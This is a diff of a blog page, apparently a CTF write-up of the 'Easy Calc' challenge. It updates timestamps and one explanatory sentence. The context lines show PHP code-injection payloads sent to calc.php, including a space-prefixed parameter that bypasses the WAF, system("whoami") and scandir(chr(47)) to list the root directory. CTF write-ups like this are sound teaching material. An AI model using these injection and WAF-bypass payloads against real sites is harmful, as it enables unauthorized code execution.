@@ -30,7 +30,7 @@
 <meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/106.png">
 <meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/107.png">
 <meta property="article:published_time" content="2021-04-16T02:26:19.000Z">
-<meta property="article:modified_time" content="2021-04-16T02:57:52.437Z">
+<meta property="article:modified_time" content="2021-04-16T02:59:42.543Z">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://www.tu3k.cn/images/php_web_ctf/100.png">
@@ -323,7 +323,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num&#x3D;123</span><br></pre></td></tr></table></figure>
 <p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们传入的参数也能被接收 代码还能正常运行，还上传了非法字符。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
-<p><img src="http://www.tu3k.cn/images/php_web_ctf/105.png" alt="calc" title="ctf_calc"><br>直接命令执行，返回空白，没执行成功，可能有些特殊符号被过滤</p>
+<p><img src="http://www.tu3k.cn/images/php_web_ctf/105.png" alt="calc" title="ctf_calc"><br>直接命令执行，返回空白，没执行成功，可能在全局过滤里（不是waf）有些特殊符号被过滤</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num&#x3D;system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>
 <p>转换为ascii执行，还是空白，看了看wp，过滤了双引号<br>使用scandir列根目录文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
@@ -343,7 +343,7 @@
         <p><span>Title:</span><a href="/2021/04/16/calc-ctf/">CTF_Easy Calc</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
         <p><span>Created:</span>2021-04-16, 10:26:19</p>
-        <p><span>Updated:</span>2021-04-16, 10:57:52</p>
+        <p><span>Updated:</span>2021-04-16, 10:59:42</p>
         <p>
             <span>Full URL:</span><a class="post-url" href="/2021/04/16/calc-ctf/" title="CTF_Easy Calc">https://www.tu3k.cn/2021/04/16/calc-ctf/</a>
             <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/04/16/calc-ctf/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
